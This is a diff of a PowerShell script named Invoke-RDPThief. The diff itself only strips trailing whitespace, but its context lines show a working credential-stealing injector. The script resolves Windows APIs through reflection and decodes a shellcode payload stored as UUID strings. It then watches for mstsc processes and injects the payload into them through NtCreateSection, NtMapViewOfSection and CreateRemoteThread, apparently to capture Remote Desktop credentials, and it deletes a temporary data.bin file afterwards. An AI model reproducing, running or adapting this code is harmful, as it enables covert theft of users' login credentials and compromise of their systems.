@@ -2,10 +2,10 @@ Function Invoke-RDPThief {
 
     function Invoke-FunctionLookup {
             Param (
-            [Parameter(Position = 0, Mandatory = $true)] 
+            [Parameter(Position = 0, Mandatory = $true)]
             [string] $moduleName,
 
-            [Parameter(Position = 1, Mandatory = $true)] 
+            [Parameter(Position = 1, Mandatory = $true)]
             [string] $functionName
         )
 
@@ -18,7 +18,7 @@ Function Invoke-RDPThief {
         return $PtrOverload.Invoke($null, @($moduleHandle, $functionName))
     }
     else {
-    
+
         $handleRefOverload = $systemType.GetMethod("GetProcAddress", [System.Reflection.BindingFlags] "Public,Static", $null, [System.Type[]] @([System.Runtime.InteropServices.HandleRef], [System.String]), $null)
         $moduleHandle = $systemType.GetMethod('GetModuleHandle').Invoke($null, @($moduleName))
         $handleRef = New-Object System.Runtime.InteropServices.HandleRef($null, $moduleHandle)
@@ -28,10 +28,10 @@ Function Invoke-RDPThief {
 
     function Invoke-GetDelegate {
         Param (
-            [Parameter(Position = 0, Mandatory = $true)] 
+            [Parameter(Position = 0, Mandatory = $true)]
             [Type[]] $parameterTypes,
 
-            [Parameter(Position = 1, Mandatory = $false)] 
+            [Parameter(Position = 1, Mandatory = $false)]
             [Type] $returnType = [Void]
         )
 
@@ -43,40 +43,40 @@ Function Invoke-RDPThief {
         $moduleBuilder = $assemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
 
         $typeBuilder = $moduleBuilder.DefineType(
-            'MyDelegateType', 
-            [System.Reflection.TypeAttributes]::Class -bor 
-            [System.Reflection.TypeAttributes]::Public -bor 
-            [System.Reflection.TypeAttributes]::Sealed -bor 
-            [System.Reflection.TypeAttributes]::AnsiClass -bor 
-            [System.Reflection.TypeAttributes]::AutoClass, 
+            'MyDelegateType',
+            [System.Reflection.TypeAttributes]::Class -bor
+            [System.Reflection.TypeAttributes]::Public -bor
+            [System.Reflection.TypeAttributes]::Sealed -bor
+            [System.Reflection.TypeAttributes]::AnsiClass -bor
+            [System.Reflection.TypeAttributes]::AutoClass,
             [System.MulticastDelegate]
         )
 
         $constructorBuilder = $typeBuilder.DefineConstructor(
-            [System.Reflection.MethodAttributes]::RTSpecialName -bor 
-            [System.Reflection.MethodAttributes]::HideBySig -bor 
+            [System.Reflection.MethodAttributes]::RTSpecialName -bor
+            [System.Reflection.MethodAttributes]::HideBySig -bor
             [System.Reflection.MethodAttributes]::Public,
             [System.Reflection.CallingConventions]::Standard,
             $parameterTypes
         )
 
         $constructorBuilder.SetImplementationFlags(
-            [System.Reflection.MethodImplAttributes]::Runtime -bor 
+            [System.Reflection.MethodImplAttributes]::Runtime -bor
             [System.Reflection.MethodImplAttributes]::Managed
         )
 
         $methodBuilder = $typeBuilder.DefineMethod(
             'Invoke',
-            [System.Reflection.MethodAttributes]::Public -bor 
-            [System.Reflection.MethodAttributes]::HideBySig -bor 
-            [System.Reflection.MethodAttributes]::NewSlot -bor 
+            [System.Reflection.MethodAttributes]::Public -bor
+            [System.Reflection.MethodAttributes]::HideBySig -bor
+            [System.Reflection.MethodAttributes]::NewSlot -bor
             [System.Reflection.MethodAttributes]::Virtual,
             $returnType,
             $parameterTypes
         )
 
         $methodBuilder.SetImplementationFlags(
-            [System.Reflection.MethodImplAttributes]::Runtime -bor 
+            [System.Reflection.MethodImplAttributes]::Runtime -bor
             [System.Reflection.MethodImplAttributes]::Managed
         )
 
@@ -84,27 +84,27 @@ Function Invoke-RDPThief {
     }
 
     $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
-    (Invoke-FunctionLookup -moduleName "Kernel32.dll" -functionName "OpenProcess"), 
+    (Invoke-FunctionLookup -moduleName "Kernel32.dll" -functionName "OpenProcess"),
     (Invoke-GetDelegate @([UInt32], [bool], [UInt32]) ([IntPtr])))
 
     $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
-    (Invoke-FunctionLookup -moduleName "Kernel32.dll" -functionName "CreateRemoteThread"), 
+    (Invoke-FunctionLookup -moduleName "Kernel32.dll" -functionName "CreateRemoteThread"),
     (Invoke-GetDelegate @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])))
 
     $NtCreateSection = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
-    (Invoke-FunctionLookup -moduleName "ntdll.dll" -functionName "NtCreateSection"), 
+    (Invoke-FunctionLookup -moduleName "ntdll.dll" -functionName "NtCreateSection"),
     (Invoke-GetDelegate @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [UInt64].MakeByRefType(), [UInt32], [UInt32], [IntPtr]) ([UInt32])))
 
     $NtMapViewOfSection = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
-    (Invoke-FunctionLookup -moduleName "ntdll.dll" -functionName "NtMapViewOfSection"), 
+    (Invoke-FunctionLookup -moduleName "ntdll.dll" -functionName "NtMapViewOfSection"),
     (Invoke-GetDelegate @([IntPtr], [IntPtr], [IntPtr].MakeByRefType(), [IntPtr], [IntPtr], [UInt64].MakeByRefType(), [UInt64].MakeByRefType(), [UInt32], [UInt32], [UInt32]) ([Int])))
 
     $NtUnmapViewOfSection = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
-    (Invoke-FunctionLookup -moduleName "ntdll.dll" -functionName "NtUnmapViewOfSection"), 
+    (Invoke-FunctionLookup -moduleName "ntdll.dll" -functionName "NtUnmapViewOfSection"),
     (Invoke-GetDelegate @([IntPtr], [IntPtr]) ([Int])))
 
     $NtClose = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
-    (Invoke-FunctionLookup -moduleName "ntdll.dll" -functionName "NtClose"), 
+    (Invoke-FunctionLookup -moduleName "ntdll.dll" -functionName "NtClose"),
     (Invoke-GetDelegate @([IntPtr]) ([Int])))
 
 [Array] $UUIDs = @(
@@ -4939,7 +4939,7 @@ Function Invoke-RDPThief {
 "74db8419-800d-20cb-0c20-3ac375044241",
 "be0fe7eb-0f02-09be-2bc1-5bc300000000",
 "00000000-9000-9090-9090-909090909090"
- 
+
  )
 
     $Warhead = New-Object byte[] ($uuids.Length * 16)
@@ -4952,7 +4952,7 @@ Function Invoke-RDPThief {
     $size = $Warhead.Length
     $buffer_size = [long]$size
     $injectedProcesses = @{}
-    
+
     Write-Output ""
     Write-Output ""
     Write-Output "[*] Hunting for mstsc..."
@@ -4967,15 +4967,15 @@ while ($true) {
         # Check if the process has been actioned already
         if (-not $injectedProcesses.ContainsKey($process.Id)) {
             try {
-                
-                [IntPtr] $ptr_section_handle = [IntPtr]::Zero    
+
+                [IntPtr] $ptr_section_handle = [IntPtr]::Zero
                 $create_section_status = $NtCreateSection.Invoke([ref] $ptr_section_handle, 0xe, [IntPtr]::Zero, [ref] $buffer_size, 0x40, 0x08000000, [IntPtr]::Zero)
 
                 [IntPtr] $ptr_local_section_addr = [IntPtr]::Zero
                 $local_section_offset = 0
                 $local_map_view_status = $NtMapViewOfSection.Invoke($ptr_section_handle, -1, [ref] $ptr_local_section_addr, [IntPtr]::Zero, [IntPtr]::Zero, [ref] $local_section_offset, [ref] $buffer_size, 0x2, 0, 0x04)
 
-                [System.Runtime.InteropServices.Marshal]::Copy($Warhead, 0, $ptr_local_section_addr, $size)    
+                [System.Runtime.InteropServices.Marshal]::Copy($Warhead, 0, $ptr_local_section_addr, $size)
 
                 $hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, [uint32]$Process.Id)
 
@@ -5010,9 +5010,9 @@ while ($true) {
         Write-Output ""
 
         Remove-Item "$env:LOCALAPPDATA\temp\data.bin" -Force -ErrorAction "SilentlyContinue"
-        
+
         }
     }
-} 
+}
 
 Invoke-RDPThief
